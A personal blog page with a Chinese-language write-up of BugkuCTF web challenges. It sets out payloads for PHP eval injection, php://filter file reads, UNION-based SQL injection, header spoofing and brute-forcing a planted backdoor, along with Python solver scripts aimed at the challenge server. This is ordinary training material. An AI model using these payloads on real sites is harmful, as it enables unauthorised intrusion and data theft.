<!DOCTYPE html>
<html lang="">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Lethe">


    <meta name="subtitle" content="Life is a struggle">


    <meta name="description" content="Lethe's Blog">


    <meta name="keywords" content="Lethe's Blog">


<title>BugkuCTF_Web_Writeup | Lethe&#39;s Blog</title>



    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/blog/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/blog/js/script.js"></script>
    
    <script src="/blog/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.1.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/blog/">Lethe&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/blog/archives">Posts</a>
                
                    <a class="menu-item" href="/blog/category">Categories</a>
                
                    <a class="menu-item" href="/blog/tag">Tags</a>
                
                    <a class="menu-item" href="/blog/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/blog/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/blog/archives">Posts</a>
                
                    <a class="menu-item" href="/blog/category">Categories</a>
                
                    <a class="menu-item" href="/blog/tag">Tags</a>
                
                    <a class="menu-item" href="/blog/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">BugkuCTF_Web_Writeup</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">March 7, 2019&nbsp;&nbsp;21:34:23</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/blog/categories/Writeup/">Writeup</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p>直接查看F12查看源码即可得flag。</p>
<br>

<h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><p>简单计算题，但输入框限制输入长度，直接改改输入框的前端代码，输入计算结果，得到flag。</p>
<br>

<h4 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h4><p>代码审计，GET方法传入what变量的值为’flag’即可得flag。<br>payload：<code>?what=flag</code></p>
<br>

<h4 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h4><p>遇上一题类似，只不过是以POST方式传参，在Firefox浏览器中的Hackbar中传入：<code>what=flag</code></p>
<br>

<h4 id="矛盾"><a href="#矛盾" class="headerlink" title="*矛盾"></a>*矛盾</h4><p>代码审计，要求传入的<code>$num</code>即不能是数字，又要等于1，才能输出flag。<br>这不是矛盾吗？我这里提供两种绕过思路构造<code>$num</code><br>（1） 在php里可以用<code>.</code>来连接字符串，所以当构造<code>num=1.&#39; &#39;</code>时，num就被当做了字符串，但由于后面连接的字符串为空，在弱比较的时候仍然会判断与1相等。<br>（2）可以想到用科学计数法表示数字1，例如：<code>1E+0.1</code>既不是纯数字，其实际值又等于1。</p>
<p>所以<code>payload</code>为<code>?num=1.&#39; &#39;</code> 或 <code>?1E+0.1</code></p>
<br>

<h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><p>查看源代码发现一串Unicode编码，在线解码网站解码即得flag</p>
<br>

<h4 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h4><p>把flag.bugku.com 解析到120.24.86.145即可得flag。<br>在<code>c:\windows\system32\drivers\etc\</code>目录下打开hosts<br>后进行修改，在最后添加上我们需要的    <code>120.24.86.145 flag.bugku.com</code><br>再访问flag.bugku.com即得flag</p>
<br>

<h4 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h4><p>题目要求<code>Stop at panda</code>，就能得到flag，但是页面上的图片再不断变化，可以BurpSuite抓包后，多次重发包，然后没几次就能看到flag。</p>
<br>

<h4 id="本地包含"><a href="#本地包含" class="headerlink" title="*本地包含"></a>*本地包含</h4><p>这道题还是可以分析一下的，关键主要时闭合、构造php代码。<br>打开题目，发现如下代码：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190306005257159.png" alt="在这里插入图片描述"></p>
<ul>
<li>首先判断肯定要通过hello传一个参数进去。</li>
<li>然后看到了<code>eval()</code>这个函数，在CTF比赛中要对这个函数非常敏感，它可以将函数里的字符串当作php代码来解析，再结合题目名：文件包含，思路应该是通过这个函数将php代码以参数传进去，来包含flag.php函数获得flag。</li>
<li>但是<code>eval()</code>函数还有一个<code>var_dump()</code>函数处理传入的参数，这时就需要先对这个函数进行闭合，然后<code>eval()</code>函数就能执行后面的php代码了。(闭合了前面的括号，别忘了最后还有一个括号)</li>
</ul>
<p>最终构造的payload：<code>?hello=);echo file_get_contents(&#39;flag.php&#39;</code><br>然后，查看网页源码，flag在源码里。</p>
<br>

<h4 id="变量1"><a href="#变量1" class="headerlink" title="*变量1"></a>*变量1</h4><p>代码审计，考察php可变变量，构造<code>?args=GLOBALS</code>，即得flag。</p>
<br>

<h4 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h4><p>查看源代码，在线JSfuck解密，将得到的字符串大写提交即可。<br>解密网站：<a target="_blank" rel="noopener" href="http://discogscounter.getfreehosting.co.uk/js-noalnum.php">http://discogscounter.getfreehosting.co.uk/js-noalnum.php</a></p>
<br>

<h4 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h4><p>flag就在http返回头里，Chrome F12-Network-F5刷新或者BurpSuite抓包即可看到flag</p>
<br>

<h4 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h4><p>扫描目录发现shell.php，根据题目，这应该是留的后门，直接用burpsuite爆破密码即可，密码为：hack</p>
<br>

<h4 id="管理员系统"><a href="#管理员系统" class="headerlink" title="*管理员系统"></a>*管理员系统</h4><p>抓包后先在请求头里增加：</p>
<pre><code>X-Forwarded-For: 127.0.0.1
</code></pre>
<p>来伪装本地ip。<br>查看源代码最后一行有一个base64字符串，解码后为<code>test123</code>（这其实是密码，一开始可能会当作用户名），用户名为：<code>admin</code>，在burpsuite里面重发包，得到flag。</p>
<br>

<h4 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h4><p>将源码里的JS代码url解码再拼接，然后审计代码，再password框里输入：<code>67d709b2b54aa2aa648cf6e87a7114f1</code>，得到flag<br><br></p>
<h4 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h4><p>进入后有一个<code>&#39;click me? no&#39;</code>链接，点击后url跳转到<code>?file=show.php</code>，判断应该为本地文件包含，利用php伪协议。<br>根据题目<code>“flag在index里”</code>，所以应包含<code>index.php</code>构造如下payload:</p>
<pre><code>?file=php://filter/read=convert.base64-encode/resource=index.php
</code></pre>
<p>得到一段base64，解码得flag。</p>
<br>

<h4 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h4><p>输入5位数得密码，告诉了位数（url里也提示了baopo），那就抓包在burpsuite里爆破即可。</p>
<br>

<h4 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h4><p>要点击100万次才行，显然不可能手点，Chrome F12查看源码，看到一段JavaScript代码，复制到Console控制台，并将点击时得<code>count++</code>代码改为<code>count+=999999</code>，然后回车，这样再点一次页面就到100万次啦。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/20190306174554688.png" alt="在这里插入图片描述"><br><br></p>
<h4 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h4><p>根据提示访问<code>index.php.bak</code>（bak是常见得备份文件），下载源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码审计得知，要构造<code>key1、key2</code>的值，使他们md5值相等，真值不同。<br>但这里通过 <code>str_replace(&#39;key&#39;,&#39;&#39;,$str)</code>过滤了<code>key</code>，把字符串里面得<code>key</code>替换为空了，但可以双写绕过。<br>最终payload：<code>?kkeyey1[]=1&amp;kkeyey2[]=2</code><br><br></p>
<h4 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h4><p>一道没有任何过滤的sql注入题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 4 #</span><br><span class="line">-1&#x27; union select 1,2,3,4 #</span><br><span class="line">-1&#x27; union select 1,2,3,table_name from information_schema.tables where table_schema=database() #</span><br><span class="line">-1&#x27; union select 1,2,3,column_name from information_schema.columns where table_name=&#x27;fl4g&#x27; #</span><br><span class="line">-1&#x27; union select 1,2,3,(select skctf_flag from fl4g) #</span><br></pre></td></tr></table></figure>
<br>

<h4 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="*秋名山老司机"></a>*秋名山老司机</h4><p>这题得写脚本来计算结果并提交，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/qiumingshan/&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">expression = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>, source.text).group()</span><br><span class="line"><span class="comment"># 正则表达式匹配算式，并将算是以字符串形式保存在expression中</span></span><br><span class="line">result = <span class="built_in">eval</span>(expression)</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据提示，将计算结果，以post方式传入value</span></span><br><span class="line">post = &#123;<span class="string">&#x27;value&#x27;</span>: result&#125; </span><br><span class="line"><span class="built_in">print</span>(s.post(url, data=post).text)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">正则表达式第二种方法</span></span><br><span class="line"><span class="string">expression = re.findall(r&#x27;&lt;div&gt;(.*?)=?;&lt;/div&gt;&#x27;, source)</span></span><br><span class="line"><span class="string">findall()输出内容只是括号匹配到的内容，不是所有内容,且以列表的形式保存</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">expression = &quot;&quot;.join(expression)</span></span><br><span class="line"><span class="string">将列表里的算式转换成字符串</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">expression = expression[:-2]</span></span><br><span class="line"><span class="string">去掉算式最后的&#x27;=？&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<br>

<h4 id="速度要快"><a href="#速度要快" class="headerlink" title="*速度要快"></a>*速度要快</h4><p>（1）先抓包，在返回头里有一串base64，解码得一句话：<code>跑的还不错，给你flag吧: NDE5NzA1</code>，很显然这肯定不是最终结果。<br>（2）查看源码，发现注释里也有一句话：<code>OK ,now you have to post the margin what you find</code>，意思，意思就是让你把刚刚发现得东西用post传给<code>margin</code><br>（3）但是发现其实刚刚抓包得到得一串字符每次都不一样，再结合题目“速度要快”，看来也是要写脚本，将得到的字符串，立刻再传过去。</p>
<p>最终使用脚本如下，即可得到flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/web6/&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag在头部信息里</span></span><br><span class="line">headers = s.get(url).headers</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(headers[<span class="string">&#x27;flag&#x27;</span>]) <span class="comment"># b64decode解码出来为byte类型</span></span><br><span class="line"></span><br><span class="line">margin = flag.decode().split(<span class="string">&#x27;: &#x27;</span>)[<span class="number">1</span>]    <span class="comment"># 使用split()前，要先将byte转换为str</span></span><br><span class="line"><span class="comment"># split的结果以列表的形式储存，所以取索引[1]来取冒号后面的字符串</span></span><br><span class="line"></span><br><span class="line">margin = base64.b64decode(margin) </span><br><span class="line">post = &#123;<span class="string">&#x27;margin&#x27;</span>:margin&#125;</span><br><span class="line"><span class="built_in">print</span>(s.post(url, data=post).text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<br>

<h4 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="*cookies欺骗"></a>*cookies欺骗</h4><p>（1）观察URL有点不对劲：<code>?line=&amp;filename=a2V5cy50eHQ=</code>，里面有串base64，解密为：keys.txt，根据<code>line</code>与<code>filename</code>判断这个URL意思应该是读取了keys.txt这个文件得第0行。<br>（2）根据推测，将后面得base64改为index.php得base64编码，即构造<code>?line=&amp;filename=aW5kZXgucGhw</code>，返回的是空白页面，但是源码里面可以看到<code>&lt;?php</code>，于是增大<code>line</code>的值就可以看到一行行代码，可以写个简单的脚本来获取<code>index.php</code>的源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get_code.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/web11/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    payload = &#123;<span class="string">&#x27;line&#x27;</span>:line, <span class="string">&#x27;filename&#x27;</span>:<span class="string">&#x27;aW5kZXgucGhw&#x27;</span>&#125; <span class="comment"># 这里filename为index.php的base64编码</span></span><br><span class="line">    <span class="built_in">print</span>(s.get(url, params=payload).text)</span><br></pre></td></tr></table></figure>
<p>可以得到index.php的源码如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;</span><br><span class="line">	<span class="variable">$fa</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$file</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到源码后，进行简单的代码审计，即要传入COOKIE: <code>margin:&#39;margin&#39;</code>，且提示了<code>keys.php</code>，因此可以写如下脚本来获得flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy5waHA=&#x27;</span></span><br><span class="line"><span class="comment">#根据index.php源码得这里filename为keys.php的base64编码</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">cookies = <span class="built_in">dict</span>(margin=<span class="string">&#x27;margin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.get(url, cookies=cookies).text)</span><br></pre></td></tr></table></figure>

<br>

<h4 id="never-give-up"><a href="#never-give-up" class="headerlink" title="*never give up"></a>*never give up</h4><p>（1）先看源码，发现<code>1p.html</code>，于是访问此页面，但是一访问就会自动跳转到bugku的首页，于是抓包，看到一大串东西。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/BugkuCTF-Writeup-Web/2019030719584180.png" alt="在这里插入图片描述"><br>（2）将这一大串东西先URL解码，再base64，再URL解码得到如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Words =<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;http://www.bugku.com&#x27;;&lt;/script&gt; </span></span><br><span class="line"><span class="string">&lt;!--&quot;</span>;<span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">&quot;f4l2a3g.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;never never never give up !!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>--&gt;<span class="string">&quot; 